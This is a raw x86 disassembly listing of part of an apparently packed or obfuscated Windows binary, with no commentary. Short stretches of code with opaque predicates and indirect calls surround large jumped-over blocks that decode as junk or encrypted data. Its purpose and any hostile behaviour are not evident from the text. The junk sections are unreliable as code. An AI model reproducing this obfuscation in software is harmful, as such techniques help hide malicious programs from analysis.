  41a317:	lea    eax,[ebp+0x4]
  41a31a:	xor    DWORD PTR [esp+0x2c],eax
  41a31e:	cmp    DWORD PTR ds:0x42821d,0x0
  41a325:	mov    DWORD PTR ds:0x428205,0x288a
  41a32f:	mov    DWORD PTR ds:0x42827d,0x47f7
  41a339:	jmp    0x41a389
  41a33e:	mov    eax,0x24e
  41a343:	cmp    DWORD PTR ds:0x42821d,0x0
  41a34a:	jge    0x41a377
  41a350:	push   0x4979
  41a355:	push   0x4282b1
  41a35a:	push   DWORD PTR [ebp-0x14]
  41a35d:	push   0x4282b1
  41a362:	push   0x6f4a
  41a367:	call   DWORD PTR ds:0x428a20
  41a36d:	sbb    DWORD PTR ds:0x4282c5,ecx
  41a373:	sbb    ecx,ecx
  41a375:	sub    ecx,ecx
  41a377:	and    DWORD PTR ds:0x42826d,ebx
  41a37d:	or     DWORD PTR ds:0x4281a1,0x6d29
  41a387:	sbb    eax,eax
  41a389:	mov    DWORD PTR [esp+0x18],0x4a47
  41a391:	jmp    0x41a627
  41a396:	std    
  41a397:	je     0x41a3c8
  41a399:	mov    dh,0xb7
  41a39b:	mov    ebp,0x1ce2b57d
  41a3a0:	cmp    eax,0xcc636e05
  41a3a5:	das    
  41a3a6:	mov    dh,0x34
  41a3a8:	sar    DWORD PTR [ebx-0x44444058],0x43
  41a3af:	push   ecx
  41a3b0:	lock push edx
  41a3b2:	pushf  
  41a3b3:	(bad)  
  41a3b4:	fmulp  st(2),st
  41a3b6:	lock test BYTE PTR ds:0x37a308d7,ah
  41a3bd:	ret    0x69f3
  41a3c0:	fmul   st,st(1)
  41a3c2:	push   ds
  41a3c3:	inc    ecx
  41a3c4:	les    ebp,FWORD PTR [ecx+0x349c896e]
  41a3ca:	push   esp
  41a3cb:	jnp    0x41a401
  41a3cd:	sbb    esp,DWORD PTR [edi]
  41a3cf:	mov    BYTE PTR [ecx+0x26],dh
  41a3d2:	inc    esi
  41a3d3:	icebp  
  41a3d4:	xor    BYTE PTR [esi+0x78d5cf9c],cl
  41a3da:	xor    BYTE PTR [ebx],ch
  41a3dc:	ss rcl ebp,0x97
  41a3e0:	adc    edi,DWORD PTR [eax-0x5d6228d]
  41a3e6:	dec    eax
  41a3e7:	mov    dh,0xc7
  41a3e9:	test   DWORD PTR [ebp+0x63],ecx
  41a3ec:	loopne 0x41a425
  41a3ee:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3f0:	or     edi,edi
  41a3f2:	dec    eax
  41a3f3:	loopne 0x41a397
  41a3f5:	repz out 0x28,al
  41a3f8:	sub    esp,DWORD PTR [eax-0x7b]
  41a3fb:	int    0x47
  41a3fd:	sbb    BYTE PTR [ebx+0x4d75293],cl
  41a403:	clc    
  41a404:	std    
  41a405:	sar    DWORD PTR [eax-0x39],1
  41a408:	add    al,0xcd
  41a40a:	nop
  41a40b:	mov    eax,0x913c563c
  41a410:	xchg   edi,eax
  41a411:	nop
  41a412:	adc    ah,BYTE PTR [esi-0x15]
  41a415:	retf   
  41a416:	data16 hlt 
  41a418:	sar    DWORD PTR [esi],0xf1
  41a41b:	sub    BYTE PTR ds:0xc75be041,ah
  41a421:	inc    edx
  41a422:	(bad)  
  41a423:	mov    cl,BYTE PTR [eax+eax*1+0x66dc0c09]
  41a42a:	scas   eax,DWORD PTR es:[edi]
  41a42b:	add    ebp,ebx
  41a42d:	jns    0x41a3d1
  41a42f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a430:	push   edi
  41a431:	push   ebp
  41a432:	mov    ebp,0x6b8ffeaa
  41a437:	ror    BYTE PTR [eax-0x4f],1
  41a43a:	and    DWORD PTR [ebx+ebx*4+0x7d],eax
  41a43e:	fdivr  st(3),st
  41a440:	dec    esp
  41a441:	imul   DWORD PTR [edx-0x3f]
  41a444:	idiv   BYTE PTR [esi+0x1aa65ecb]
  41a44a:	mov    WORD PTR [edi+ecx*2+0x4],fs
  41a44e:	btr    DWORD PTR [ecx-0x2],ebp
  41a452:	neg    BYTE PTR [eax-0x64]
  41a455:	mov    ds,WORD PTR [ebp-0x90a61ce]
  41a45b:	push   esp
  41a45c:	xor    DWORD PTR [ebx-0x7a],esp
  41a45f:	cs (bad) 
  41a461:	fild   DWORD PTR gs:[ecx]
  41a464:	push   eax
  41a465:	sub    dh,BYTE PTR [ecx+0xd0cf5d6]
  41a46b:	call   0x1762:0x1e9553d8
  41a472:	js     0x41a4e9
  41a474:	sbb    DWORD PTR [esi],edx
  41a476:	jae    0x41a4a4
  41a478:	mov    bh,0x0
  41a47a:	cmp    DWORD PTR [ebp-0x2c],eax
  41a47d:	pusha  
  41a47e:	xor    BYTE PTR [eax+0x2a11bc05],bh
  41a484:	sbb    BYTE PTR [ebp+ecx*8-0x53],bl
  41a488:	rcl    edx,cl
  41a48a:	rcr    BYTE PTR [edi+0x69],1
  41a48d:	add    ah,BYTE PTR [ebp-0x12f2401e]
  41a493:	push   ebx
  41a494:	ins    BYTE PTR es:[edi],dx
  41a495:	arpl   WORD PTR [esi-0x6e],bp
  41a498:	repnz dec eax
  41a49a:	sbb    al,0x80
  41a49c:	icebp  
  41a49d:	in     al,0x2f
  41a49f:	aam    0xe1
  41a4a1:	jnp    0x41a42c
  41a4a3:	xchg   DWORD PTR [ebx-0x4f],esi
  41a4a6:	sub    dh,BYTE PTR [ebx+0x57]
  41a4a9:	adc    bh,0x12
  41a4ac:	cli    
  41a4ad:	je     0x41a4a3
  41a4af:	cs push ds
  41a4b1:	pushf  
  41a4b2:	out    0xa9,eax
  41a4b4:	cmp    BYTE PTR [edx+0x13],ch
  41a4b7:	xor    ecx,DWORD PTR [ebp-0x1c]
  41a4ba:	aad    0xa
  41a4bc:	sbb    al,0xbb
  41a4be:	sahf   
  41a4bf:	sbb    al,0xd4
  41a4c1:	or     ebx,DWORD PTR [eax-0x37a1112a]
  41a4c7:	or     eax,0x83438a30
  41a4cc:	fldcw  WORD PTR [ecx-0x4]
  41a4cf:	pop    edx
  41a4d0:	pop    es
  41a4d1:	mov    esp,0x10bf8ade
  41a4d6:	push   es
  41a4d7:	(bad)  
  41a4d8:	dec    ecx
  41a4d9:	sti    
  41a4da:	or     DWORD PTR [eax+eax*2+0x68],esp
  41a4de:	dec    edx
  41a4df:	xchg   edx,eax
  41a4e0:	sbb    al,0xc
  41a4e2:	out    0x30,al
  41a4e4:	iret   
  41a4e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4e6:	xchg   edx,eax
  41a4e7:	and    eax,0x9ad81edc
  41a4ec:	adc    al,0x79
  41a4ee:	fidiv  WORD PTR [ecx-0x673ed2e]
  41a4f4:	dec    esp
  41a4f5:	dec    edx
  41a4f6:	lods   al,BYTE PTR ds:[esi]
  41a4f7:	outs   dx,BYTE PTR ds:[esi]
  41a4f8:	pop    ebp
  41a4f9:	ss and edx,ecx
  41a4fc:	jnp    0x41a526
  41a4fe:	out    0x15,eax
  41a500:	cli    
  41a501:	xchg   esi,eax
  41a502:	pop    ebx
  41a503:	or     al,0x71
  41a505:	aam    0x2c
  41a507:	or     al,0xfa
  41a509:	out    dx,al
  41a50a:	bound  dx,DWORD PTR [ecx-0x15dcfe17]
  41a511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a512:	repnz imul eax,esp,0xf67bc129
  41a519:	dec    edi
  41a51a:	add    al,0x6e
  41a51c:	inc    edi
  41a51d:	ret    0x3905
  41a520:	push   0xffffffdf
  41a522:	test   BYTE PTR [edx+0x7511771c],0x95
  41a529:	fbld   TBYTE PTR [ecx+esi*4+0x3297aabd]
  41a530:	xor    ch,BYTE PTR [esi-0x516c89f0]
  41a536:	in     al,0x33
  41a538:	in     eax,dx
  41a539:	inc    eax
  41a53a:	adc    bl,ah
  41a53c:	add    edx,DWORD PTR [edi-0x71]
  41a53f:	pop    ecx
  41a540:	pusha  
  41a541:	xor    eax,0xea732f14
  41a546:	sbb    BYTE PTR [eax-0x3d58d5f7],ah
  41a54c:	lock es retf 0xd604
  41a551:	mov    al,0xc1
  41a553:	ins    DWORD PTR es:[edi],dx
  41a554:	enter  0x621b,0x27
  41a558:	xlat   BYTE PTR ds:[ebx]
  41a559:	inc    ebp
  41a55a:	jo     0x41a5ae
  41a55c:	out    0x78,eax
  41a55e:	fldcw  WORD PTR [esi+0x35]
  41a561:	sahf   
  41a562:	dec    ebx
  41a563:	ffreep st(5)
  41a565:	(bad)  
  41a566:	push   eax
  41a567:	and    DWORD PTR gs:[edx],esi
  41a56a:	xlat   BYTE PTR ds:[ebx]
  41a56b:	pop    ebp
  41a56c:	out    dx,al
  41a56d:	fld    TBYTE PTR cs:[edi+esi*1-0x32]
  41a572:	mov    esp,0xe3ff4493
  41a577:	and    DWORD PTR [ebx+esi*8+0x3905daec],eax
  41a57e:	das    
  41a57f:	adc    BYTE PTR [ecx-0x356a0e8a],0x6f
  41a586:	fmul   st,st(5)
  41a588:	lock nop
  41a58a:	in     al,0x24
  41a58c:	pop    edi
  41a58d:	jno    0x41a5b7
  41a58f:	sub    BYTE PTR [edi+0x11],al
  41a592:	jg     0x41a5ad
  41a594:	mov    ds:0x22cdf08b,eax
  41a599:	or     ebp,esp
  41a59b:	outs   dx,BYTE PTR ds:[esi]
  41a59c:	stos   DWORD PTR es:[edi],eax
  41a59d:	dec    ebx
  41a59e:	leave  
  41a59f:	mov    ebx,0x334a4e9f
  41a5a4:	dec    esi
  41a5a5:	mov    WORD PTR [esp+esi*4-0x76],es
  41a5a9:	arpl   WORD PTR [edx+esi*4],sp
  41a5ac:	or     eax,0x6e23c427
  41a5b1:	and    al,0xee
  41a5b3:	jnp    0x41a612
  41a5b5:	pop    esp
  41a5b6:	mov    esp,0x45beb3a4
  41a5bb:	dec    esi
  41a5bc:	cmp    esi,edi
  41a5be:	sbb    al,ch
  41a5c0:	and    cl,BYTE PTR [edx-0x41]
  41a5c3:	mov    esp,0x2702a7c6
  41a5c8:	jg     0x41a617
  41a5ca:	cmp    DWORD PTR [ebp-0x16],esp
  41a5cd:	pop    ss
  41a5ce:	out    dx,eax
  41a5cf:	js     0x41a58b
  41a5d1:	sub    bh,BYTE PTR [ebp+edi*8+0x46]
  41a5d5:	dec    ebp
  41a5d6:	pop    ds
  41a5d7:	inc    edx
  41a5d8:	jmp    0x2b9f62c2
  41a5dd:	shl    DWORD PTR [esi+edi*8-0x5ece64ec],0x83
  41a5e5:	loop   0x41a5d2
  41a5e7:	sub    al,BYTE PTR [esi+0x69]
  41a5ea:	imul   ebp,esi,0x8fb4931f
  41a5f0:	ins    BYTE PTR es:[edi],dx
  41a5f1:	icebp  
  41a5f2:	hlt    
  41a5f3:	loopne 0x41a5f0
  41a5f5:	push   es
  41a5f6:	sahf   
  41a5f7:	jae    0x41a676
  41a5f9:	enter  0x2831,0x0
  41a5fd:	(bad)  
  41a5fe:	test   eax,0x6d78672d
  41a603:	push   0x42
  41a605:	sbb    ebp,0xffffffb7
  41a608:	pop    edx
  41a609:	or     al,0xd1
  41a60b:	aaa    
  41a60c:	ffreep st(4)
  41a60e:	push   0x2f
  41a610:	int3   
  41a611:	inc    esp
  41a612:	jmp    0x41a676
  41a614:	mov    edx,DWORD PTR [ebp+0x6eae5ec3]
  41a61a:	lods   eax,DWORD PTR ds:[esi]
  41a61b:	ret    
  41a61c:	ss loopne 0x41a666
  41a61f:	fld    TBYTE PTR [edi+0x67]
  41a622:	(bad)  
  41a623:	popf   
  41a624:	fisttp DWORD PTR [ebx+0x64]
  41a627:	mov    DWORD PTR [esp+0x1c],0x40ed
  41a62f:	and    eax,eax
  41a631:	mov    DWORD PTR [esp+0x20],0x4944
  41a639:	mov    DWORD PTR [esp+0x24],0x4b06
  41a641:	add    DWORD PTR ds:0x428209,edx
  41a647:	mov    eax,ds:0x422728
  41a64c:	mov    ecx,DWORD PTR ds:0x42272c
  41a652:	mov    DWORD PTR ds:0x428215,0x3cb1
  41a65c:	push   ebx
  41a65d:	sub    DWORD PTR ds:0x428195,0x60f6
  41a667:	push   0xbd9b3b7c
  41a66c:	push   ecx
  41a66d:	push   eax
  41a66e:	sub    DWORD PTR ds:0x428221,0x428289
  41a678:	call   0x418100
  41a67d:	cmp    DWORD PTR ds:0x42821d,0x0
  41a684:	mov    DWORD PTR ds:0x428231,ebx
  41a68a:	mov    DWORD PTR ds:0x42822d,0x850
  41a694:	mov    DWORD PTR ds:0x4282b1,0x132c
  41a69e:	jmp    0x41a6fa
  41a6a3:	mov    DWORD PTR ds:0x4282d1,0x2c76
  41a6ad:	mov    DWORD PTR ds:0x428225,0x5bf1
  41a6b7:	cmp    DWORD PTR ds:0x42821d,0x0
  41a6be:	jl     0x41a6e0
  41a6c4:	push   DWORD PTR [ebp-0x24]
  41a6c7:	push   0x607c
  41a6cc:	call   DWORD PTR ds:0x428a24
  41a6d2:	and    DWORD PTR ds:0x428239,0x5e54
  41a6dc:	xor    ecx,ecx
  41a6de:	and    ebx,ecx
  41a6e0:	or     DWORD PTR ds:0x42820d,edi
  41a6e6:	xor    ebx,ebx
  41a6e8:	or     ebx,DWORD PTR ds:0x428229
  41a6ee:	sbb    DWORD PTR ds:0x428201,ebx
  41a6f4:	add    ecx,0x6c7e
  41a6fa:	mov    ecx,DWORD PTR ds:0x422720
  41a700:	xor    DWORD PTR ds:0x4281ad,edx
  41a706:	mov    ebx,DWORD PTR ds:0x422724
  41a70c:	sub    eax,ecx
  41a70e:	mov    DWORD PTR ds:0x428195,0x4d39
  41a718:	sbb    edx,ebx
  41a71a:	cmp    DWORD PTR ds:0x428205,0x0
  41a721:	mov    ebx,DWORD PTR ds:0x4281ad
  41a727:	mov    ecx,0x133c
  41a72c:	mov    DWORD PTR ds:0x428269,0x4728
  41a736:	jmp    0x41a78e
  41a73b:	mov    ebx,DWORD PTR ds:0x4282cd
  41a741:	cmp    DWORD PTR ds:0x428205,0x0
  41a748:	jae    0x41a778
  41a74e:	call   DWORD PTR ds:0x428a28
  41a754:	mov    ebx,DWORD PTR ds:0x4282f1
  41a75a:	mov    ebx,DWORD PTR [ebx]
  41a75c:	sub    DWORD PTR ds:0x428275,ebx
  41a762:	sub    ebx,ecx
  41a764:	dec    ebx
  41a765:	movzx  ecx,WORD PTR ds:0x4281a5
  41a76c:	add    ecx,DWORD PTR ds:0x428191
  41a772:	mov    DWORD PTR ds:0x4281a5,ecx
  41a778:	and    DWORD PTR ds:0x428205,0x2c9a
  41a782:	mov    ebx,DWORD PTR ds:0x4282c1
  41a788:	add    DWORD PTR ds:0x428289,ebx
  41a78e:	mov    ecx,edx
  41a790:	mov    edx,DWORD PTR [esp+0x20]
  41a794:	mov    ebx,DWORD PTR [esp+0x24]
  41a798:	sub    eax,edx
  41a79a:	mov    edx,DWORD PTR [esp+0x18]
  41a79e:	sbb    ecx,ebx
  41a7a0:	mov    ebx,DWORD PTR [esp+0x1c]
  41a7a4:	sub    eax,edx
  41a7a6:	sbb    ecx,ebx
  41a7a8:	or     ecx,0x2ccf
  41a7ae:	or     eax,0x740f
  41a7b3:	mov    DWORD PTR [esp+0x10],eax
  41a7b7:	mov    DWORD PTR [esp+0x14],ecx
  41a7bb:	mov    DWORD PTR [esp+0x18],0x10ff
  41a7c3:	mov    DWORD PTR [esp+0x1c],0x7336
  41a7cb:	mov    DWORD PTR [esp+0x20],0xe55
  41a7d3:	mov    DWORD PTR [esp+0x24],0x5710
  41a7db:	mov    ecx,DWORD PTR ds:0x422730
  41a7e1:	mov    edx,DWORD PTR ds:0x422734
  41a7e7:	mov    eax,0x1d57
  41a7ec:	sub    eax,ecx
  41a7ee:	mov    ecx,0x50d6
  41a7f3:	sbb    ecx,edx
  41a7f5:	mov    edx,DWORD PTR [esp+0x20]
  41a7f9:	mov    ebx,DWORD PTR [esp+0x24]
  41a7fd:	push   0x3
  41a7ff:	add    edx,eax
  41a801:	push   0xc5bcf99e
  41a806:	adc    ebx,ecx
  41a808:	push   ebx
  41a809:	push   edx
  41a80a:	call   0x418100
  41a80f:	mov    ecx,DWORD PTR [esp+0x18]
  41a813:	mov    ebx,DWORD PTR [esp+0x1c]
  41a817:	or     eax,ecx
  41a819:	mov    ecx,DWORD PTR [esp+0x10]
  41a81d:	or     edx,ebx
  41a81f:	cmp    DWORD PTR [esp+0x14],edx
  41a823:	jb     0x41cd71
  41a829:	ja     0x41a837
  41a82f:	cmp    ecx,eax
  41a831:	jb     0x41cd71
  41a837:	mov    eax,0x489f
  41a83c:	mov    WORD PTR [esp+0x20],ax
  41a841:	mov    eax,0x177e
  41a846:	mov    WORD PTR [esp+0x10],ax
  41a84b:	mov    eax,0x3cbd
  41a850:	mov    WORD PTR [esp+0x18],ax
  41a855:	movzx  eax,WORD PTR [esp+0x18]
  41a85a:	mov    cx,WORD PTR [esp+0x10]
  41a85f:	add    ax,cx
  41a862:	mov    cx,WORD PTR [esp+0x20]
  41a867:	jmp    0x41aafd
  41a86c:	std    
  41a86d:	aas    
  41a86e:	jge    0x41a834
  41a870:	jge    0x41a86f
  41a872:	jge    0x41a8eb
  41a874:	int3   
  41a875:	pop    edx
  41a876:	stos   DWORD PTR es:[edi],eax
  41a877:	cmp    eax,DWORD PTR [eax-0x6b]
  41a87a:	mov    ecx,0xc138a52f
  41a87f:	mov    ebx,0xbbbbbfa8
  41a884:	or     ebp,DWORD PTR [eax]
  41a886:	mov    eax,ds:0x6daf8e58
  41a88b:	test   eax,ecx
  41a88d:	mov    edx,0x98b024ce
  41a892:	or     BYTE PTR [esi+0x20cba10b],al
  41a898:	inc    ebx
  41a899:	out    dx,eax
  41a89a:	dec    eax
  41a89b:	cmp    DWORD PTR [ecx],0xffffff83
  41a89e:	test   BYTE PTR [ecx-0x54b1d56],bl
  41a8a4:	dec    edx
  41a8a5:	mov    eax,gs:0x5a13010e
  41a8ab:	adc    al,0x44
  41a8ad:	add    DWORD PTR [ebx-0x75fa3b84],ebx
  41a8b3:	sahf   
  41a8b4:	sbb    dl,BYTE PTR [ebp-0x7e]
  41a8b7:	pop    esp
  41a8b8:	pop    eax
  41a8b9:	pop    eax
  41a8ba:	or     BYTE PTR [ebx],0x6c
  41a8bd:	or     eax,0xe325f10a
  41a8c2:	sar    DWORD PTR [esi+0x19da89],0x10
  41a8c9:	sbb    al,0x10
  41a8cb:	push   ebx
  41a8cc:	mov    ecx,0xae9fb353
  41a8d1:	or     DWORD PTR [eax-0x3ba76526],esi
  41a8d7:	add    eax,0x75f87836
  41a8dc:	xor    al,0x89
  41a8de:	jae    0x41a8e4
  41a8e0:	jo     0x41a8f7
  41a8e2:	mov    bl,BYTE PTR [eax]
  41a8e4:	push   ss
  41a8e5:	ins    BYTE PTR es:[edi],dx
  41a8e6:	mov    al,BYTE PTR [edx-0x66]
  41a8e9:	mov    ecx,0x1b2add60
  41a8ee:	aam    0x2b
  41a8f0:	enter  0xdc6,0x33
  41a8f4:	xchg   edi,eax
  41a8f5:	aad    0x31
  41a8f7:	sbb    bh,0xb7
  41a8fa:	push   0xffffffef
  41a8fc:	xor    ecx,ebx
  41a8fe:	nop
  41a8ff:	pushf  
  41a900:	mov    esi,0x54ddec6b
  41a905:	into   
  41a906:	cmp    dl,dl
  41a908:	in     al,dx
  41a909:	push   ds
  41a90a:	imul   esi,DWORD PTR [esi],0x412bb7be
  41a910:	(bad)  
  41a911:	push   esi
  41a912:	add    ah,BYTE PTR [eax-0x2aca4304]
  41a918:	out    0x37,eax
  41a91a:	lods   ax,WORD PTR ds:[esi]
  41a91c:	jl     0x41a8a4
  41a91e:	and    al,BYTE PTR [edi-0x428cc669]
  41a924:	add    al,bh
  41a926:	add    eax,0x3498f2c5
  41a92b:	or     eax,0x9b7e9032
  41a930:	xor    eax,ecx
  41a932:	xchg   al,bh
  41a934:	and    bl,ch
  41a936:	jo     0x41a9b5
  41a938:	pop    ds
  41a939:	pop    es
  41a93a:	xor    BYTE PTR [ecx+0x4fb626cb],bh
  41a940:	rol    BYTE PTR [edx],cl
  41a942:	daa    
  41a943:	neg    BYTE PTR [ebx-0x340d07a0]
  41a949:	inc    edx
  41a94a:	jae    0x41a90c
  41a94c:	xchg   esp,eax
  41a94d:	(bad)
  41a951:	mov    cl,0xa4
  41a953:	lahf   
  41a954:	test   al,0xe0
  41a956:	xchg   edi,eax
  41a957:	shl    DWORD PTR [ecx],1
  41a959:	push   0x9bc64874
  41a95e:	xchg   ebx,eax
  41a95f:	adc    BYTE PTR ds:0x21fc3c64,cl
  41a965:	sub    eax,0x19b46c56
  41a96a:	add    eax,DWORD PTR [ebp+0x79]
  41a96d:	or     cl,ch
  41a96f:	in     al,dx
  41a970:	fcom   QWORD PTR [edi+ebx*8-0x25]
  41a974:	cmp    eax,edi
  41a976:	sub    eax,0xe25b7b5f
  41a97b:	sahf   
  41a97c:	repz cmp bh,ch
  41a97f:	out    0xcd,al
  41a981:	lods   al,BYTE PTR ds:[esi]
  41a982:	dec    edi
  41a983:	mov    WORD PTR [ebx+ebx*1-0x1dc5678c],?
  41a98a:	shl    BYTE PTR [esi],0x2d
  41a98d:	sbb    eax,0x3db833a3
  41a992:	mov    ah,0x9
  41a994:	jge    0x41a9cc
  41a996:	jae    0x41a9c6
  41a998:	nop
  41a999:	pushf  
  41a99a:	pop    esi
  41a99b:	cmc    
  41a99c:	cmp    al,BYTE PTR [ebx-0x5e50be3d]
  41a9a2:	pop    es
  41a9a3:	iret   
  41a9a4:	scas   al,BYTE PTR es:[edi]
  41a9a5:	sar    DWORD PTR [ebx],0xc8
  41a9a8:	pop    es
  41a9a9:	sahf   
  41a9aa:	or     esi,DWORD PTR [ebx+0x1a]
  41a9ad:	dec    ebp
  41a9ae:	push   0xffffffe7
  41a9b0:	retf   0xda01
  41a9b3:	push   ecx
  41a9b4:	shl    BYTE PTR [eax],cl
  41a9b6:	stos   DWORD PTR es:[edi],eax
  41a9b7:	mov    ds:0x86877f35,eax
  41a9bc:	in     eax,0x10
  41a9be:	adc    eax,DWORD PTR [edx-0x7b3d86f3]
  41a9c4:	adc    esp,0xd418bb72
  41a9ca:	ja     0x41a956
  41a9cc:	call   0x774d:0x3b712cbf
  41a9d3:	jg     0x41a9d1
  41a9d5:	ret    
  41a9d6:	das    
  41a9d7:	popf   
  41a9d8:	and    ch,ch
  41a9da:	xchg   ebx,eax
  41a9db:	adc    dl,0x1c
  41a9de:	jle    0x41aa25
  41a9e0:	xor    eax,esi
  41a9e2:	mov    ch,0x24
  41a9e4:	xchg   ebx,eax
  41a9e5:	mov    ds:0x56d0e276,al
  41a9ea:	sub    ch,BYTE PTR es:[ecx]
  41a9ed:	adc    al,0xbc
  41a9ef:	aaa    
  41a9f0:	dec    ebp
  41a9f1:	pop    ebp
  41a9f2:	int3   
  41a9f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9f4:	or     esp,edi
  41a9f6:	(bad)  
  41a9f7:	rol    DWORD PTR [esi-0x6b],1
  41a9fa:	lea    ebp,[edx-0x78]
  41a9fd:	pop    ss
  41a9fe:	bound  esp,QWORD PTR [ebp+ebx*2+0x6a]
  41aa02:	cli    
  41aa03:	mov    WORD PTR [ebx],cs
  41aa05:	cmp    BYTE PTR ds:0xe012d9db,ah
  41aa0b:	mov    al,0x8c
  41aa0d:	or     eax,0x454a1592
  41aa13:	dec    ecx
  41aa14:	jg     0x41a9cf
  41aa16:	xchg   esp,eax
  41aa17:	leave  
  41aa18:	lods   al,BYTE PTR ds:[esi]
  41aa19:	push   ss
  41aa1a:	jl     0x41a9c7
  41aa1c:	pop    esp
  41aa1d:	jno    0x41a9d6
  41aa1f:	fwait
  41aa20:	sub    al,0x75
  41aa22:	nop
  41aa23:	or     dl,BYTE PTR [edx-0x5b]
  41aa26:	out    dx,eax
  41aa27:	lods   al,BYTE PTR ds:[esi]
  41aa28:	adc    ebp,DWORD PTR [ecx]
  41aa2a:	ss cli 
  41aa2c:	das    
  41aa2d:	jo     0x41aa10
  41aa2f:	cmp    ebp,DWORD PTR [edx]
  41aa31:	rol    BYTE PTR [edi],cl
  41aa33:	push   es
  41aa34:	mov    edi,0x3d1f2262
  41aa39:	out    0xcf,eax
  41aa3b:	pop    ds
  41aa3c:	or     BYTE PTR ds:0xf3ae4037,0x5
  41aa43:	jecxz  0x41aa01
  41aa45:	dec    ebx
  41aa46:	sub    al,0x6f
  41aa48:	add    ch,BYTE PTR [eax+0x3d]
  41aa4b:	data16 inc BYTE PTR [eax-0x21]
  41aa4f:	pop    ss
  41aa50:	mov    al,0x5c
  41aa52:	inc    ecx
  41aa53:	sbb    DWORD PTR [ebp+0x59],esi
  41aa56:	xchg   ecx,eax
  41aa57:	test   DWORD PTR [ecx-0x1ad5dc66],edi
  41aa5d:	or     ebp,DWORD PTR [esi-0x25d49d73]
  41aa63:	ds sub eax,0x4b5c36a7
  41aa69:	mov    edx,0x9153883f
  41aa6e:	cli    
  41aa6f:	adc    eax,0x4bbf8e3
  41aa74:	jmp    0x5cf5:0xf3688c2f
  41aa7b:	push   ss
  41aa7c:	cdq    
  41aa7d:	add    DWORD PTR [ebp-0xef1f14a],esp
  41aa83:	je     0x41aa09
  41aa85:	or     eax,0x81188765
  41aa8a:	cmp    DWORD PTR [esp+ebx*8],ecx
  41aa8d:	les    ebx,FWORD PTR [ebp-0x6d35af16]
  41aa93:	ficom  WORD PTR [eax-0x27]
  41aa96:	mov    ds:0x21511f3e,al
  41aa9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa9c:	jnp    0x41aaf4
  41aa9e:	mov    ecx,0x88a2be14
  41aaa3:	and    eax,0xa91424e4
  41aaa8:	push   ebp
  41aaa9:	aaa    
  41aaaa:	pop    esi
  41aaab:	jmp    0x577b:0xe5ac58b9
  41aab2:	leave  
  41aab3:	lods   al,BYTE PTR ds:[esi]
  41aab4:	inc    ebp
  41aab5:	adc    DWORD PTR [eax+0x1f4d56d9],edi
  41aabb:	rol    DWORD PTR [edx-0x619faee3],0xf2
  41aac2:	test   eax,0x58588864
  41aac7:	and    dh,BYTE PTR [esp+edx*1+0x39b8886d]
  41aace:	pop    ebp
  41aacf:	cld    
  41aad0:	outs   dx,BYTE PTR ds:[esi]
  41aad1:	sub    al,0x75
  41aad3:	retf   
  41aad4:	test   cl,0xe3
  41aad7:	add    edi,edx
  41aad9:	inc    ecx
  41aada:	rcr    BYTE PTR ds:[edx-0x5334f741],cl
  41aae1:	fcomp  QWORD PTR [eax-0xc6393ac]
  41aae7:	out    0x2f,eax
  41aae9:	mov    ch,0x1e
  41aaeb:	sbb    ecx,DWORD PTR [ebx-0x7f]
  41aaee:	inc    esp
  41aaef:	in     eax,dx
  41aaf0:	fxch   st(5)
  41aaf2:	sub    al,ah
  41aaf4:	out    0x54,eax
  41aaf6:	ret    0xa45b
  41aaf9:	cld    
  41aafa:	inc    eax
  41aafb:	jo     0x41aaa8
  41aafd:	add    ax,cx
  41ab00:	movzx  ecx,WORD PTR ds:0x422738
  41ab07:	push   0xb
  41ab09:	sub    eax,ecx
  41ab0b:	mov    WORD PTR [esp+0x1c],ax
  41ab10:	xor    eax,eax
  41ab12:	inc    eax
  41ab13:	mov    WORD PTR [esp+0x24],ax
  41ab18:	movzx  eax,WORD PTR ds:0x422744
  41ab1f:	mov    cx,WORD PTR [esp+0x24]
  41ab24:	and    eax,0x10c1
  41ab29:	movzx  ecx,cx
  41ab2c:	cdq    
  41ab2d:	idiv   ecx
  41ab2f:	pop    ecx
  41ab30:	movzx  eax,ax
  41ab33:	cdq    
  41ab34:	idiv   ecx
  41ab36:	mov    cx,WORD PTR ds:0x422740
  41ab3d:	movzx  ecx,cx
  41ab40:	movzx  eax,ax
  41ab43:	and    eax,ecx
  41ab45:	mov    cx,WORD PTR ds:0x42273c
  41ab4c:	movzx  ecx,cx
  41ab4f:	cdq    
  41ab50:	idiv   ecx
  41ab52:	mov    cx,WORD PTR [esp+0x18]
  41ab57:	cmp    cx,ax
  41ab5a:	je     0x41cd71
  41ab60:	mov    eax,DWORD PTR [esp+0x2c]
  41ab64:	mov    edx,DWORD PTR [esp+0x58]
  41ab68:	jmp    0x41adfe
  41ab6d:	jg     0x41aba9
  41ab6f:	xchg   ebx,eax
  41ab70:	ret    0x1397
  41ab73:	pop    DWORD PTR [esi+0x6fd8a5b3]
  41ab79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab7a:	in     eax,dx
  41ab7b:	or     esi,DWORD PTR [ecx]
  41ab7d:	mov    bh,BYTE PTR [edx]
  41ab7f:	sar    DWORD PTR [ebx-0x44444058],0xa2
  41ab86:	dec    ecx
  41ab87:	pop    es
  41ab88:	cmp    cl,BYTE PTR [eax+0x58]
  41ab8b:	(bad)  
  41ab8c:	mov    cl,0xc
  41ab8e:	or     ch,ah
  41ab90:	pusha  
  41ab91:	mov    dl,0x9d
  41ab93:	mov    edx,?
  41ab95:	inc    esi
  41ab96:	test   eax,0x5cadb427
  41ab9b:	addr16 call 0x43c7:0xac70a18b
  41aba3:	sbb    eax,0x4d97b927
  41aba8:	mov    dl,0xe4
  41abaa:	push   esp
  41abab:	cmp    DWORD PTR [esi],edx
  41abad:	adc    ch,BYTE PTR [eax-0x5fedd53b]
  41abb3:	mov    eax,ds:0x927e2195
  41abb8:	inc    edi
  41abb9:	int    0x97
  41abbb:	push   0x6585c815
  41abc0:	cmc    
  41abc1:	test   DWORD PTR [ebx+0x62be1517],0x78212427
  41abcb:	les    ebp,FWORD PTR [edx-0x1ae1f210]
  41abd1:	adc    esi,ecx
  41abd3:	or     eax,ecx
  41abd5:	mov    bl,0xdc
  41abd7:	lods   al,BYTE PTR ds:[esi]
  41abd8:	addr16 mov al,ds:0x25ae
  41abdc:	add    DWORD PTR [ecx],esi
